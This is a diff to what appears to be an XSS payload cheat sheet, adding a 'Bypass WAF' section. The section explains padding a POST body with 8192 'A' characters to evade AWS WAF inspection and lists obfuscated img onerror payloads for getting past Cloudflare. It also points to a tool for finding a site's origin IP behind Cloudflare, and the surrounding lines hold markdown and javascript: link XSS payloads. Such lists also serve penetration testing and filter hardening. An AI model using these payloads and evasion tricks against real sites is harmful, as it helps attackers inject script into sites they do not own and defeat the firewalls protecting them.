@@ -292,6 +292,23 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [ ](http://a?p=[[/onclick=alert(0) .]])
 [a](javascript:new%20Function`al\ert\`1\``;)
 ```
+## Bypass WAF
+
+### Bypass AWS Post Based XSS
+``Adding 8192 "A" before your payload allow you to bypass AWS WAF for POST request``
+
+![image](https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/80288b44-4ca7-46e8-be0d-c74b47b61d17)
+
+https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/
+
+### Bypass Cloudflare
+```
+<img//////src=x oNlY=1 oNerror=alert('xxs')//
+<img src=x on onerror=alert()>
+```
+- Identify server origin
+https://github.com/gwen001/cloudflare-origin-ip
+
 
 ## Events
 ```js
